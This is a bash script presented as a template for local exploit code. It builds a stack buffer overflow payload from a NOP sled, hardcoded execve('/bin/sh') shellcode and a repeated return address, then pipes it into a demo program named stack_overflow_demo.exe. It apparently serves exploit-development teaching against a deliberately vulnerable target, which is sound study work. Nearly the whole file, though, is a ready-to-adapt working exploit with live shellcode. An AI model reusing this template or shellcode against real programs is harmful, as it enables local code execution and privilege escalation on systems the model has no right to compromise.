#!/bin/bash
#
# Template for local interactive exploit code using bash script
#

# Generate payload file in the format: | NOP sled | shellcode | repeated return address |
# write each line of shellcode generated by PEDA to a file

# bulnerable program to exploit
target_program="stack_overflow_demo.exe"
python3 -c 'print("A"*500, end="")' | ./$target_program

payload_size=116 # EIP+0 or EBP+4 in PEDA

# feed buffer variable's address in Little Endian; reverse of what you see on screen
# add a few bytes so it's in the middle
# printf "%x" $((0xffffc36c + half of NOP Size))
printf "buffer_address: %x\n" $((0xffffc36c + 34))
buffer_address="\x10\xc3\xff\xff"

# write shellcode to a file
shellcode_file_name="shellcode.bin"
echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31" > $shellcode_file_name
echo -ne "\xc9\x89\xca\x6a\x0b\x58\xcd\x80" >> $shellcode_file_name
wc -c shellcode.bin
shellcode_size=24 # find and update the shellcode_size if necessary
return_address_count=5
return_address_size=$((4*$return_address_count)) # repeat return address 5 times
NOP_sled_size=$(($payload_size-$shellcode_size-$return_address_size))
printf "NOP Sled size: %d half-way: %d\n" $NOP_sled_size $((NOP_sled_size/2))
# now we've all the sizes we need for each section of the payload, write the complete payload to a file

# create an emptyfile, truncate if exists
payload_file_name="payload.bin"
echo -n > $payload_file_name

# write NOPs
for (( i=1; i <= $NOP_sled_size; i++ ))
do
    echo -ne "\x90" >> $payload_file_name
done

# write shellcode
cat $shellcode_file_name >> $payload_file_name

# write repeated return address
for (( i=1; i <= $return_address_count; i++ ))
do
    echo -ne $buffer_address >> $payload_file_name
done

echo "payload ready and has size of " $(wc -c $payload_file_name)
hexdump -C $payload_file_name
echo "sending the payload..."
cat $payload_file_name | ./$target_program
